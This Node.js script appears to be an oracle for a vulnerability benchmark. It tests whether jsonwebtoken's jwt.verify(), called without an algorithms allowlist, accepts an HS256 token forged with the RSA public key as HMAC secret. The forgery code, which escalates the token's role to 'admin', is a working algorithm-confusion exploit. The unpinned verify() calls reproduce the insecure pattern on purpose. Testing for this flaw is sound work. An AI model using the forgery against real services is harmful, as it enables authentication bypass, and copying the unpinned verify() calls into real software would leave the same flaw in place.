'use strict';
const jwt = require('jsonwebtoken');
const crypto = require('node:crypto');

function b64url(buf) {
  return buf.toString('base64').replace(/=+$/, '').replace(/\+/g, '-').replace(/\//g, '_');
}

function main() {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  try {
    // Setup: generate an RSA key pair. The "server" only distributes the public
    // key for verification purposes (e.g. to verify tokens issued by a trusted
    // RS256 signer). The HMAC attack below reuses this public key string as an
    // HMAC secret, which is the classic alg-confusion forgery against jwt.verify()
    // when the caller does not explicitly pin algorithms.
    const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
      modulusLength: 2048,
      publicKeyEncoding: { type: 'spki', format: 'pem' },
      privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
    });

    const marker = 'JWT_ORACLE_' + Date.now() + '_' + Math.random().toString(36).slice(2);

    // --- Benign operation first: sign with RS256 and verify with RS256 (no algorithms option) ---
    const benignToken = jwt.sign({ marker, role: 'user' }, privateKey, { algorithm: 'RS256' });

    // Call verify the way a naive/legacy integration would: passing the public
    // key without an explicit `algorithms` allowlist. This mirrors the historic
    // insecure-default-usage pattern that the vulnerability description refers to.
    const benignDecoded = jwt.verify(benignToken, publicKey);

    if (!benignDecoded || benignDecoded.marker !== marker || benignDecoded.role !== 'user') {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'Benign RS256 sign/verify roundtrip failed to produce expected payload.'
      }));
      return;
    }

    // Benign op succeeded; from here operation_completed may become true.
    operation_completed = true;

    // --- Malicious attempt: algorithm confusion attack ---
    // Attacker crafts a token with alg=HS256, signing it using the RSA public key
    // (a known, non-secret PEM string) as the HMAC secret. Calling jwt.verify()
    // the same way as above (no `algorithms` restriction) should reject this on
    // a patched library, but accept it on the vulnerable one because the
    // insecure default allows any algorithm including HS256 to be validated
    // against whatever key object is supplied.
    const forgedPayload = { marker, role: 'admin' };
    const headerB64 = b64url(Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })));
    const payloadB64 = b64url(Buffer.from(JSON.stringify(forgedPayload)));
    const signingInput = headerB64 + '.' + payloadB64;
    const hmac = b64url(crypto.createHmac('sha256', publicKey).update(signingInput).digest());
    const forgedToken = signingInput + '.' + hmac;

    try {
      // Same calling convention as the benign call above: public key supplied,
      // no `algorithms` allowlist. This is the exact scenario the CVE concerns.
      const forgedDecoded = jwt.verify(forgedToken, publicKey);

      if (forgedDecoded && forgedDecoded.marker === marker && forgedDecoded.role === 'admin') {
        exploit_succeeded = true;
        evidence = 'jwt.verify() (no algorithms restriction) accepted an HS256-forged token signed with the RSA public key as HMAC secret, decoding payload: ' + JSON.stringify(forgedDecoded);
      } else {
        exploit_succeeded = false;
        evidence = 'jwt.verify() returned an unexpected result for forged token: ' + JSON.stringify(forgedDecoded);
      }
    } catch (verifyErr) {
      // Verification correctly rejected the forged token -> patched behavior.
      exploit_succeeded = false;
      evidence = 'Forged HS256 token was rejected by jwt.verify(): ' + (verifyErr && verifyErr.message ? verifyErr.message : String(verifyErr));
    }

    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed,
      exploit_succeeded,
      evidence
    }));
  } catch (err) {
    // Any unexpected failure during setup or the benign operation must be
    // reported as operation_completed=false, never as a successful block.
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Unexpected exception: ' + (err && err.message ? err.message : String(err))
    }));
  }
}

main();
